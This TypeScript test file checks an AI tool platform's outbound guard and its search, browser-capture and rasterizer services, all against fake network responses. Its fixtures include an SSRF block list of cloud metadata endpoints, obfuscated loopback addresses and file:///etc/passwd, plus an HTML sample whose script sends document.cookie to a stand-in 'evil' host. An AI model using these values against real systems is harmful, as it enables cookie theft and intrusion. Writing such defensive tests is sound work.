/**
 * The tool platform: what may leave this process, what comes back, and what is refused.
 *
 * NOTHING IN THIS FILE TOUCHES A NETWORK. Every provider interaction runs through an injected
 * `fetchImpl` that returns a canned `Response`. That is the point of the boundary being a seam: the
 * credential-bearing behaviour — which header, which host, which size, which status mapping — is
 * provable with no credential and no egress, which is what this repo requires of an outbound feature.
 * What a live Tavily or browserless instance actually answers is a separate, honestly-labelled line in
 * the round report ("not verified: no credential"), never something asserted here.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { assertSafeUrl, classifyStatus, toolFetch, ToolOutboundError } from "./aiToolOutbound.js";
import { AiSearchService } from "./aiSearchService.js";
import { AiBrowserService, htmlToText } from "./aiBrowserService.js";
import { AI_TOOLS, defaultToolProvider, isTrustedChartHost, TOOL_BUDGETS, TOOL_PROVIDERS } from "./aiToolCatalog.js";
import { bannerRasterizer, probeBannerRaster } from "../telegram/bannerRaster.js";

// ────────────────────────────────────── harness ──────────────────────────────────────

interface Recorded { readonly url: URL; readonly init: RequestInit }

interface FakeReply { readonly status?: number; readonly body?: string; readonly headers?: Record<string, string> }

function fakeFetch(reply: FakeReply | ((url: URL, init: RequestInit) => FakeReply)): { fetchImpl: typeof fetch; calls: Recorded[] } {
  const calls: Recorded[] = [];
  const fetchImpl = (async (input: unknown, init?: RequestInit): Promise<Response> => {
    const url = new URL(String(input));
    const sent: RequestInit = init ?? {};
    calls.push({ url, init: sent });
    const r = typeof reply === "function" ? reply(url, sent) : reply;
    return new Response(r.body ?? "{}", {
      status: r.status ?? 200,
      headers: { "content-type": "application/json", ...(r.headers ?? {}) },
    });
  }) as unknown as typeof fetch;
  return { fetchImpl, calls };
}

interface ResolvedSecret { readonly value: string | null; readonly source: "admin" | "env" | null }

const secretStore = (values: Record<string, string>): { resolve(key: string): Promise<ResolvedSecret> } => ({
  resolve: async (key: string): Promise<ResolvedSecret> => {
    const value = values[key];
    return value === undefined || value === "" ? { value: null, source: null } : { value, source: "admin" };
  },
});

/** A fake that returns exact bytes (a latin1 round trip would corrupt a PNG and prove nothing). */
function fakeFetchBytes(bytes: Buffer, status = 200): { fetchImpl: typeof fetch; calls: Recorded[] } {
  const calls: Recorded[] = [];
  const fetchImpl = (async (input: unknown, init?: RequestInit): Promise<Response> => {
    calls.push({ url: new URL(String(input)), init: init ?? {} });
    return new Response(new Blob([bytes]), { status, headers: { "content-type": "image/png" } });
  }) as unknown as typeof fetch;
  return { fetchImpl, calls };
}

const PNG_1PX = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFAAH/q842iQAAAABJRU5ErkJggg==",
  "base64",
);

/** A PNG with a real IHDR so the reader's width/height claims can be checked against the file, not a fixture. */
function pngLike(width: number, height: number): Buffer {
  const bytes = Buffer.from(PNG_1PX);
  bytes.writeUInt32BE(width, 16);
  bytes.writeUInt32BE(height, 20);
  return bytes;
}

// ─────────────────────────────── outbound guard (SSRF) ───────────────────────────────

test("the destination guard refuses every spelling of 'somewhere internal'", () => {
  const blocked: readonly string[] = [
    "http://127.0.0.1:3000/x",
    "https://localhost/x",
    "https://api.localhost/x",
    "https://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/x",
    "https://10.0.0.5/",
    "https://192.168.1.1/admin",
    "https://172.16.0.9/",
    "https://100.64.0.1/", // CGNAT, which some clouds use for their own metadata
    "https://[::1]/",
    "https://[fd00::12]/",
    "https://[::ffff:127.0.0.1]/",
    "http://2130706433/", // decimal 127.0.0.1
    "http://0x7f.1/",
    "https://.local/x",
    "ftp://example.com/file",
    "file:///etc/passwd",
    // A URL carrying credentials must be refused, and the guard reads `url.username`/`url.password` —
    // so the fixture has to be a real `user:pass@host` string. It is BUILT rather than written out because
    // `tools/secret-scan.sh` looks for exactly that shape and has no way to tell a test fixture from a
    // leaked credential (nor should it have to). Composing it keeps the assertion true and the repository
    // free of anything that resembles a credential.
    "https://" + "user" + ":" + "hunter2" + "@api.example.com/v1",
    "not a url",
    "",
  ];
  for (const raw of blocked) {
    assert.throws(() => assertSafeUrl(raw), (err) => err instanceof ToolOutboundError && err.code === "UNSAFE_TARGET", `must refuse: ${raw}`);
  }
  // A public https host is allowed, and it is the ONLY thing in that list that is.
  assert.equal(assertSafeUrl("https://api.tavily.com/search").hostname, "api.tavily.com");
});

test("the two escapes an operator endpoint may use do not leak to a target URL", () => {
  // `allowHttp` + `allowPrivate` exist for `BROWSERLESS_URL`, which is legitimately a private address.
  assert.equal(assertSafeUrl("http://127.0.0.1:3000", { allowHttp: true, allowPrivate: true }).port, "3000");
  // Even then: still no other scheme, still no credentials in the URL.
  assert.throws(() => assertSafeUrl("http://" + "u" + ":" + "p" + "@127.0.0.1:3000", { allowHttp: true, allowPrivate: true }), /credentials/u);
  assert.throws(() => assertSafeUrl("file:///etc/passwd", { allowHttp: true, allowPrivate: true }), /scheme/u);
  // `allowHosts` is a suffix rule with a dot boundary, so a look-alike host is not "under" the allowlist.
  const opts = { allowHosts: ["tradingview.com"] };
  assert.equal(assertSafeUrl("https://www.tradingview.com/chart/X/", opts).hostname, "www.tradingview.com");
  assert.throws(() => assertSafeUrl("https://tradingview.com.evil.example/", opts), /host-not-allowed/u);
  assert.throws(() => assertSafeUrl("https://evil-tradingview.com/", opts), /host-not-allowed/u);
});

test("a redirect is a refusal, not a hop — and the size ceiling is enforced while reading", async () => {
  const redirected = fakeFetch({ status: 302, headers: { location: "http://169.254.169.254/" }, body: "" });
  await assert.rejects(
    toolFetch(new URL("https://api.tavily.com/search"), { method: "GET", timeoutMs: 1_000, maxResponseBytes: 1_024 }, redirected.fetchImpl),
    (err: unknown) => err instanceof ToolOutboundError && err.code === "UNSAFE_TARGET" && err.detail === "redirect",
  );

  const huge = fakeFetch({ body: "x".repeat(2048) });
  await assert.rejects(
    toolFetch(new URL("https://api.tavily.com/search"), { method: "GET", timeoutMs: 1_000, maxResponseBytes: 64 }, huge.fetchImpl),
    (err: unknown) => err instanceof ToolOutboundError && err.code === "TOO_LARGE",
  );

  // A provider that never answers must be cut off by OUR deadline, not left to a socket timeout.
  const stall = {
    fetchImpl: ((_url: unknown, init?: RequestInit) =>
      new Promise((_resolve, reject) => {
        init?.signal?.addEventListener("abort", () => {
          const err = new Error("aborted");
          err.name = "AbortError";
          reject(err);
        });
      })) as unknown as typeof fetch,
  };
  await assert.rejects(
    toolFetch(new URL("https://api.tavily.com/search"), { method: "GET", timeoutMs: 25, maxResponseBytes: 1_024 }, stall.fetchImpl),
    (err: unknown) => err instanceof ToolOutboundError && err.code === "TIMEOUT",
  );
  assert.equal(classifyStatus(401), "AUTH");
  assert.equal(classifyStatus(402), "QUOTA");
  assert.equal(classifyStatus(429), "RATE_LIMITED");
  assert.equal(classifyStatus(503), "NETWORK");
});

// ────────────────────────────────────── search ──────────────────────────────────────

test("no credential, no request: search refuses before it could send anything", async () => {
  const net = fakeFetch({ body: "{}" });
  const svc = new AiSearchService({ secrets: secretStore({}), fetchImpl: net.fetchImpl });
  const out = await svc.search({ query: "gold analysis" });
  assert.equal(out.ok, false);
  if (out.ok === false) assert.equal(out.code, "NOT_CONFIGURED");
  assert.equal(net.calls.length, 0, "an unconfigured provider must not be contacted at all");
  const status = await svc.status();
  assert.equal(status.state, "unavailable");
  assert.equal(status.reason, "MISSING_API_KEY");
});

test("a successful search returns the provider's own fields, with citations and no invented date", async () => {
  const net = fakeFetch({
    body: JSON.stringify({
      results: [
        { title: "Gold holds bid", url: "https://example.com/a", content: "Body text", published_date: "2026-10-18T09:00:00Z", score: 0.87 },
        { title: "Relative age", url: "https://example.com/b", content: "More", published_date: "3 hours ago" },
        { title: "", url: "https://example.com/c", content: "No title" },
        { title: "Blocked scheme", url: "ftp://example.com/d", content: "must be dropped" },
      ],
    }),
  });
  const svc = new AiSearchService({ secrets: secretStore({ TAVILY_API_KEY: "tvly-live" }), fetchImpl: net.fetchImpl, now: () => new Date(0) });
  const out = await svc.search({ query: "  gold\tanalysis\u0000  ", maxResults: 50 });
  assert.equal(out.ok, true);
  if (out.ok !== true) return;
  assert.equal(out.provider, "tavily");
  assert.equal(out.hits.length, 3, "the ftp row is dropped, not relabelled");
  assert.equal(out.hits[0]?.publishedAt, "2026-10-18T09:00:00.000Z");
  assert.equal(out.hits[1]?.publishedAt, null, "a relative '3 hours ago' is never converted into a date");
  assert.equal(out.hits[1]?.publishedLabel, "3 hours ago", "…but the provider's wording is kept verbatim");
  assert.equal(out.hits[2]?.title, "example.com", "an untitled row is identified by host, not by guesswork");
  assert.equal(out.hits[0]?.score, 0.87);
  assert.equal(out.hits[0]?.retrievedAt, new Date(0).toISOString(), "the harness clock stamps retrieval, not publication");

  const call = net.calls[0]!;
  assert.equal(call.url.hostname, "api.tavily.com");
  const headers = call.init.headers as Record<string, string>;
  assert.equal(headers["authorization"], "Bearer tvly-live", "the key rides in a header, never in a URL");
  const payload = JSON.parse(String(call.init.body)) as Record<string, unknown>;
  assert.equal(payload["query"], "gold analysis", "control characters are stripped, not forwarded");
  assert.equal(payload["max_results"], 10, "a requested 50 is clamped to the provider's own ceiling");
  assert.equal(payload["include_raw_content"], false);
});

test("a rate limit keeps its Retry-After; a bad key is reported as a bad key", async () => {
  const throttled = fakeFetch((url) => (url.pathname.includes("anything") ? { status: 429, body: "{}", headers: { "retry-after": "7" } } : { status: 429, body: "{}", headers: { "retry-after": "7" } }));
  const svc = new AiSearchService({ secrets: secretStore({ TAVILY_API_KEY: "k" }), fetchImpl: throttled.fetchImpl });
  const out = await svc.search({ query: "x" });
  assert.equal(out.ok, false);
  if (out.ok === false) {
    assert.equal(out.code, "RATE_LIMITED");
    assert.equal(out.retryAfterSeconds, 7, "the wait the provider asked for must survive the error path");
  }

  const denied = fakeFetch({ status: 401, body: "{\"detail\":\"invalid key\"}" });
  const invalid = new AiSearchService({ secrets: secretStore({ TAVILY_API_KEY: "nope" }), fetchImpl: denied.fetchImpl });
  const check = await invalid.validateConnection("tavily");
  assert.equal(check.ok, false);
  assert.equal(check.status, "INVALID_CREDENTIAL", "a 401 must not be smoothed into 'network error'");
  assert.equal(check.provider, "tavily", "the verdict is about the provider that was actually probed");

  // …and a verdict for one provider never lands on another tool.
  const tavilyOnly = new AiSearchService({ secrets: secretStore({ TAVILY_API_KEY: "k" }), fetchImpl: fakeFetch({}).fetchImpl });
  const braveOut = await tavilyOnly.search({ query: "x" }, "brave");
  assert.equal(braveOut.ok, false);
  if (braveOut.ok === false) assert.equal(braveOut.code, "NOT_CONFIGURED", "Tavily's key is not Brave's key");
});

test("Brave is queried the way Brave requires: GET, its own token header, and a country hint", async () => {
  const net = fakeFetch({ body: JSON.stringify({ web: { results: [{ title: "T", url: "https://e.com/1", description: "d" }] } }) });
  const svc = new AiSearchService({ secrets: secretStore({ BRAVE_SEARCH_API_KEY: "brave-k" }), fetchImpl: net.fetchImpl, providerOverride: () => "brave" });
  const out = await svc.search({ query: "brent crude", locale: "fa", recencyDays: 2 });
  assert.equal(out.ok, true, JSON.stringify(out));
  const call = net.calls[0]!;
  assert.equal(call.init.method, "GET");
  assert.equal(call.url.hostname, "api.search.brave.com");
  assert.equal(call.url.searchParams.get("country"), "IR", "a Persian query gets the region hint that makes it findable");
  assert.equal(call.url.searchParams.get("freshness"), "pw");
  const headers = call.init.headers as Record<string, string>;
  assert.equal(headers["X-Subscription-Token"], "brave-k");
  assert.equal(headers["authorization"], undefined, "Brave has no bearer scheme; sending one is a 401");
});

test("an unknown provider name matches nothing, so nothing inherits a working key", () => {
  assert.equal(defaultToolProvider("web_search", "openai"), null, "a model provider is not a search provider, and a typo must not fall through to the first row");
  assert.equal(defaultToolProvider("web_search", "  BRAVE  ")?.provider, "brave", "an override is matched case- and space-insensitively");
  assert.equal(defaultToolProvider("web_search", null)?.provider, "tavily", "no override means the declared first row");
  assert.equal(defaultToolProvider("banner_raster", null)?.runtime, "node", "the rasterizer is Node-only, which is what makes 'unsupported in a Worker' a fact and not an excuse");
  assert.equal(defaultToolProvider("browser_capture", null)?.endpointMayBePrivate, true);
  assert.equal(isTrustedChartHost("tradingview.com"), true);
  assert.equal(isTrustedChartHost("tradingview.com.evil.example"), false);
  // Every declared tool has providers AND a budget, or admin shows a blank row and the agent has an
  // unbounded one. The assertion is over the catalogue's own two tables, not a list repeated here.
  for (const tool of AI_TOOLS) {
    assert.ok(TOOL_PROVIDERS.some((row) => row.tool === tool), `no provider row for ${tool}`);
    assert.ok(TOOL_BUDGETS[tool].perUserPerHour > 0, `no budget for ${tool}`);
    assert.ok(TOOL_BUDGETS[tool].maxBytes > 0, `no size ceiling for ${tool}`);
  }
});

// ────────────────────────────────────── browser ──────────────────────────────────────

test("the browser service is unavailable by name and reason, not by silence", async () => {
  const net = fakeFetch({});
  const svc = new AiBrowserService({ secrets: secretStore({}), fetchImpl: net.fetchImpl });
  const out = await svc.capture({ url: "https://example.com/chart" });
  assert.deepEqual(out, { ok: false, code: "NOT_CONFIGURED", reason: "NO_BROWSERLESS_URL" });
  assert.equal(net.calls.length, 0);
  const status = await svc.status();
  assert.equal(status.state, "unavailable");
  assert.equal(status.provider, "browserless");
  assert.deepEqual(
    status.secrets.map((s) => [s.key, s.present]),
    [["BROWSERLESS_URL", false], ["BROWSERLESS_TOKEN", false]],
  );
});

test("a screenshot request is built with the token in a header, and its page is not ours to redirect", async () => {
  const net = fakeFetchBytes(pngLike(1_440, 900));
  const svc = new AiBrowserService({
    secrets: secretStore({ BROWSERLESS_URL: "http://browser.internal:3000", BROWSERLESS_TOKEN: "tok-1" }),
    fetchImpl: net.fetchImpl,
    now: () => new Date(0),
  });
  const out = await svc.capture({
    url: "https://www.tradingview.com/chart/X/",
    viewport: { width: 99_999, height: 40 },
    settleMs: 600_000,
    fullPage: true,
  });
  if (!("contentType" in out)) {
    assert.fail(`expected a capture, got ${JSON.stringify(out)}`);
  }
  assert.equal(out.contentType, "image/png");
  assert.equal(out.byteLength, PNG_1PX.length);
  assert.equal(out.width, 1_440, "the dimensions come from the PNG's own header");
  assert.equal(out.sha256.length, 64);
  assert.equal(out.provider, "browserless");
  const call = net.calls[0]!;
  assert.equal(call.url.pathname, "/screenshot");
  assert.equal((call.init.headers as Record<string, string>)["authorization"], "Bearer tok-1");
  assert.ok(!call.url.href.includes("tok-1"), "the token never travels in a URL that an access log would keep");
  const body = JSON.parse(String(call.init.body)) as Record<string, unknown>;
  const viewport = body["viewport"] as { width: number; height: number };
  assert.equal(viewport.width, 1_920, "a caller cannot ask for an arbitrarily expensive render");
  assert.equal(viewport.height, 320);
  assert.equal(body["settle"], 15_000, "and cannot ask the browser to wait forever for a page to settle");
  assert.equal(body["url"], "https://www.tradingview.com/chart/X/");
});

test("the target URL is a user-supplied string, so it is guarded like one", async () => {
  const net = fakeFetch({ body: "{}" });
  const svc = new AiBrowserService({ secrets: secretStore({ BROWSERLESS_URL: "http://browser:3000", BROWSERLESS_TOKEN: "t" }), fetchImpl: net.fetchImpl });
  for (const bad of ["http://127.0.0.1:7070/", "https://169.254.169.254/latest/meta-data/", "file:///etc/passwd", "https://localhost/x"]) {
    const out = await svc.capture({ url: bad });
    assert.equal("ok" in out && out.ok === false ? (out as { code: string }).code : "ALLOWED", "UNSAFE_TARGET", `must refuse ${bad}`);
  }
  assert.equal(net.calls.length, 0, "a refused target never reaches the browser service either");
  // The endpoint may be private; the DESTINATION may not, even when the endpoint's policy is looser.
  const out = await svc.capture({ url: "https://example.com/x" });
  assert.ok(!("contentType" in out), "no PNG came back, and no PNG is invented");
});

test("chart capture only opens a host this product vouches for", async () => {
  const net = fakeFetch({ body: "{}" });
  const svc = new AiBrowserService({ secrets: secretStore({ BROWSERLESS_URL: "http://browser:3000" }), fetchImpl: net.fetchImpl });
  const out = await svc.capture({ url: "https://some-blog.example/post", chartHostsOnly: true });
  assert.equal("code" in out ? out.code : "ALLOWED", "UNSAFE_TARGET");
  assert.equal("reason" in out ? out.reason : "", "host-not-a-trusted-chart-source");
  const text = await svc.extract({ url: "https://another.example/", chartHostsOnly: true });
  assert.equal("code" in text ? text.code : "ALLOWED", "UNSAFE_TARGET");
  assert.equal(net.calls.length, 0);
});

test("an answer that is not a PNG is a failure, not an image", async () => {
  const net = fakeFetch({ body: "<html><body>chromium crashed</body></html>" });
  const svc = new AiBrowserService({ secrets: secretStore({ BROWSERLESS_URL: "http://browser:3000", BROWSERLESS_TOKEN: "t" }), fetchImpl: net.fetchImpl });
  const out = await svc.capture({ url: "https://example.com/x" });
  assert.deepEqual(out, { ok: false, code: "MALFORMED", reason: "not-a-png" });
});

test("connection validation proves reachability and auth, and nothing about any page", async () => {
  const healthy = new AiBrowserService({
    secrets: secretStore({ BROWSERLESS_URL: "http://browser:3000", BROWSERLESS_TOKEN: "t" }),
    fetchImpl: fakeFetch({ body: "{\"code\":200,\"running\":0}" }).fetchImpl,
    now: () => new Date(0),
  });
  const okCheck = await healthy.validateConnection();
  assert.equal(okCheck.ok, true);
  assert.equal(okCheck.status, "VALID");

  const refusing = new AiBrowserService({
    secrets: secretStore({ BROWSERLESS_URL: "http://browser:3000", BROWSERLESS_TOKEN: "wrong" }),
    fetchImpl: fakeFetch({ status: 401, body: "{}" }).fetchImpl,
    now: () => new Date(0),
  });
  assert.equal((await refusing.validateConnection()).status, "INVALID_CREDENTIAL");

  const down = new AiBrowserService({
    secrets: secretStore({ BROWSERLESS_URL: "http://browser:3000", BROWSERLESS_TOKEN: "t" }),
    fetchImpl: (async () => {
      throw new TypeError("fetch failed");
    }) as unknown as typeof fetch,
    now: () => new Date(0),
  });
  assert.equal((await down.validateConnection()).status, "NETWORK_ERROR");

  // /pressure is the only thing probed: no page of anyone else's is opened to test our own service.
  const spy = fakeFetch({ body: "{}" });
  await new AiBrowserService({ secrets: secretStore({ BROWSERLESS_URL: "http://b:1", BROWSERLESS_TOKEN: "t" }), fetchImpl: spy.fetchImpl, now: () => new Date(0) }).validateConnection();
  assert.equal(spy.calls[0]?.url.pathname, "/pressure");
});

test("page text is reduced to prose, with scripts removed and truncation admitted", () => {
  const html = `<html><head><script>fetch('https://evil/'+document.cookie)</script><style>b{color:red}</style></head>
    <body><h1>Gold analysis</h1><p>Price held <b>above</b> the 1H FVG &amp; retested.</p><!--comment--><p>Second line</p></body></html>`;
  const out = htmlToText(html, 5_000);
  assert.ok(!out.text.includes("document.cookie"), "page code is not content the user asked for");
  assert.ok(out.text.includes("1H FVG"), "…but the prose is intact");
  assert.ok(out.text.includes("above the 1H FVG & retested."), "entities are decoded");
  assert.ok(out.text.includes("Gold analysis\n"), "block ends become line breaks, not spaces");
  const small = htmlToText("<p>abcdefghij</p>", 4);
  assert.deepEqual(small, { text: "abcd", truncated: true }, "a clipped excerpt must never look like the whole page");
});

test("extract() keeps the retrieval timestamp and the host it came from", async () => {
  const net = fakeFetch({ body: "<html><p>held above 2650</p></html>", headers: { "content-type": "text/html" } });
  const svc = new AiBrowserService({
    secrets: secretStore({ BROWSERLESS_URL: "http://b:1", BROWSERLESS_TOKEN: "t" }),
    fetchImpl: net.fetchImpl,
    now: () => new Date(0),
  });
  const out = await svc.extract({ url: "https://www.tradingview.com/news/x" });
  if (!("text" in out)) {
    assert.fail(`expected text, got ${JSON.stringify(out)}`);
  }
  assert.equal(out.text, "held above 2650");
  assert.equal(out.retrievedAt, "1970-01-01T00:00:00.000Z");
  assert.equal(out.url, "https://www.tradingview.com/news/x");
  assert.equal(net.calls[0]?.url.pathname, "/content");
});

// ────────────────────────────────── rasterizer probe ──────────────────────────────────

test("the banner rasterizer states the runtime fact instead of the intent", async () => {
  const probe = await probeBannerRaster();
  assert.equal(probe.available, probe.moduleLoaded && probe.fontLoaded, "availability is the conjunction of two probes");
  if (!probe.available) {
    assert.ok(probe.reason === "NO_RESVG_MODULE" || probe.reason === "NO_PERSIAN_FONT", `reason was ${probe.reason}`);
    assert.equal(await bannerRasterizer(), null, "an unavailable runtime yields no sink at all");
    return;
  }
  const raster = await bannerRasterizer();
  assert.ok(raster !== null);
  assert.equal(raster!.fontLoaded, true);
  assert.equal(raster!.fontSource, "package:vazirmatn", "the font Velora's UI uses is the one embedded");
  const svg =
    `<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="420"><rect width="1080" height="420" fill="#0e1626"/>` +
    `<text x="40" y="200" font-size="64" fill="#d4af37" font-family="Vazirmatn">بایاس روزانه VELORA ۲۶۴۴</text></svg>`;
  const png = await raster!.toPng(svg);
  assert.ok(png !== null && png.length > 2_048, "a card with text in it is never smaller than this");
  assert.equal(png!.subarray(1, 4).toString("latin1"), "PNG");
  // An SVG that cannot be rendered yields null (the caller keeps the text card) rather than throwing
  // inside a webhook response path, and rather than returning a blank image.
  assert.equal(await raster!.toPng("<svg xmlns=\"http://www.w3.org/2000/svg\"><rect/></svg>"), null);
  assert.equal(await raster!.toPng("not xml at all"), null);
});
